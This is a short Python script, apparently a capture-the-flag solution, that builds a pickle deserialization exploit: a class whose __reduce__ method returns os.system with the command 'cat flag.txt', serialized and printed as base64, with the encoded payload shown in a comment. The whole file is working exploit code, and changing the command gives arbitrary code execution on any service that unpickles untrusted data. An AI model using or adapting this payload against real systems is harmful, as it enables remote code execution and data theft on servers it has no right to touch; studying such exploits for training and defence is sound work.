#!/usr/bin/env python3

import os
import pickle
import base64

CMD = 'cat flag.txt'

class RunCmd(object):
    def __reduce__(self):
        return(os.system, (CMD,))


print(base64.b64encode(pickle.dumps(RunCmd())))
# Y3Bvc2l4CnN5c3RlbQpwMAooUydjYXQgZmxhZy50eHQnCnAxCnRwMgpScDMKLg==